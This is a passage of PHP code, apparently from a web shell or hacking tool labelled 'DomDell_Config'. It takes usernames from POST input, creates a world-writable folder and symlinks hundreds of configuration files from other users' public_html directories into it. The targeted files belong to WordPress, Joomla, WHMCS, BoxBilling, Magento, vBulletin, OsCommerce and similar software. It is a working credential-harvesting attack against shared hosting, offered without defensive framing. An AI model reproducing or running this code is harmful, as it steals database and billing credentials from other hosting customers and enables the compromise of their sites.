                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clients/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BILLINGS/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Billings/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billings/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/MY/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/My/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/my/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/whm/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/whmcs/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/panel/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientes/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cliente/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/order/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/boxbilling/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/box/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/host/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Host/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/supportes/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/hosting/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/order/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/client/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clients/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cliente/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientes/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billing/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billings/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/my/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/order/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/zencart/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/products/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/shop/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/hostbills/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/host/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Host/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/supportes/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/hosting/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/order/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/client/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clients/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cliente/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientes/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billing/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/my/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/order/includes/iso4217.php', $r . $us . '..Hostbills');
                }
    ?>
                <?php
                echo "<center>";
                echo "<br/>";
                echo "<a href='DomDell_Config'>Configuration Files</a>";
                echo "</center>";
                ?>
    <?php

            }
        } else {
            if (file_exists("DomDell_Config")) {
                echo "<center>";
                echo "<br/>";
                echo "<a href='DomDell_Config'>Configuration Files</a>";
                echo "</center>";
            } else {
                $dir = mkdir(getcwd() . "/DomDell_Config", 0777);
                $usr = explode("\n", $_POST['config2']);
                foreach ($usr as $uss) {
                    $us = trim($uss);
                    $r = getcwd() . "/DomDell_Config/";
                    symlink("/" . $_POST['home'] . "/" . $us . "/" . "config.php", $r . $us . "config.php");
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wp-config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/inc/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/include/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/inc/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/include/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/configuration/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/conf/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/connect/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/connect/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/configuration/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/db/config.php', $r . $us . '..wp-config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wordpress/wp-config.php', $r . $us . '..word-wp');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/blog/wp-config.php', $r . $us . '..wpblog');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/configuration.php', $r . $us . '..joomla-or-whmcs');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/joomla/configuration.php', $r . $us . '..joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/vb/includes/config.php', $r . $us . '..vbinc');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/includes/config.php', $r . $us . '..vb');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/conf_global.php', $r . $us . '..conf_global');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/inc/config.php', $r . $us . '..inc');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/config.php', $r . $us . '..config');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Settings.php', $r . $us . '..Settings');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/sites/default/settings.php', $r . $us . '..sites');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whm/configuration.php', $r . $us . '..whm');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmcs/configuration.php', $r . $us . '..whmcs');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/configuration.php', $r . $us . '..supporwhmcs');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmc/WHM/configuration.php', $r . $us . '..WHM');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whm/WHMCS/configuration.php', $r . $us . '..whmc');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whm/whmcs/configuration.php', $r . $us . '..WHMcs');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/configuration.php', $r . $us . '..whmcsupp');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clients/configuration.php', $r . $us . '..whmcs-cli');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/client/configuration.php', $r . $us . '..whmcs-cl');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientes/configuration.php', $r . $us . '..whmcs-CL');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cliente/configuration.php', $r . $us . '..whmcs-Cl');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientsupport/configuration.php', $r . $us . '..whmcs-csup');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billing/configuration.php', $r . $us . '..whmcs-bill');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/admin/config.php', $r . $us . '..admin-conf');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/config/koneksi.php', $r . $us . '..Lokomedia');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/forum/config.php', $r . $us . '..phpBB');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/sites/default/settings.php', $r . $us . '..Drupal');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/config/settings.inc.php', $r . $us . '..PrestaShop');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/app/etc/local.xml', $r . $us . '..Magento');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/application/config/database.php', $r . $us . '..Ellislab');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/vb/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/forum/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/forums/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cc/includes/config.php', $r . $us . '..Vbulletin');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/inc/config.php', $r . $us . '..MyBB');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/shop/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/os/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/oscom/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/products/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/includes/configure.php', $r . $us . '..OsCommerce');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/inc/conf_global.php', $r . $us . '..IPB');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wp/test/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/blog/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/beta/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/portal/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/site/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wp/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/WP/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/news/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/wordpress/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/test/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/demo/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/home/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/v1/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/v2/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/press/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/new/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/blogs/wp-config.php', $r . $us . '..Wordpress');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/blog/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cms/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/beta/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/portal/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/site/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/main/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/home/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/demo/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/test/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/v1/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/v2/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/joomla/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/new/configuration.php', $r . $us . '..Joomla');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/WHMCS/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmcs1/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Whmcs/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmcs/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmcs/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/WHMC/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Whmc/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whmc/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/WHM/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Whm/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/whm/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/HOST/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Host/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/host/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/SUPPORTES/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Supportes/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/supportes/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/domains/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/domain/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Hosting/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/HOSTING/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/hosting/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CART/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Cart/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/ORDER/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Order/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/order/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CLIENT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Client/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/client/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CLIENTAREA/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Clientarea/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientarea/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/SUPPORT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Support/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BILLING/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Billing/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billing/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BUY/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Buy/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/buy/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/MANAGE/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Manage/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/manage/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CLIENTSUPPORT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/ClientSupport/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Clientsupport/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientsupport/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CHECKOUT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Checkout/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/checkout/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BILLINGS/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Billings/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billings/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BASKET/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Basket/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/basket/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/SECURE/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Secure/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/SALES/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Sales/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/sales/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BILL/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Bill/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/bill/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/PURCHASE/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Purchase/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/purchase/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/ACCOUNT/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Account/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/account/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/USER/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/User/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/user/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/CLIENTS/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Clients/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clients/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/BILLINGS/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Billings/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billings/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/MY/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/My/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/my/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/whm/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/whmcs/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/panel/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientes/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cliente/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/order/submitticket.php', $r . $us . '..WHMCS');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/boxbilling/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/box/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/host/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Host/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/supportes/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/support/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/hosting/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/order/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/client/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clients/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cliente/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/clientes/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billing/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/billings/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/my/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/secure/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/order/bb-config.php', $r . $us . '..BoxBilling');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/zencart/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/products/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/cart/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/shop/includes/dist-configure.php', $r . $us . '..Zencart');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/hostbills/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/host/includes/iso4217.php', $r . $us . '..Hostbills');
                    symlink("/" . $_POST['home'] . "/" . $us . '/public_html/Host/includes/iso4217.php', $r . $us . '..Hostbills');
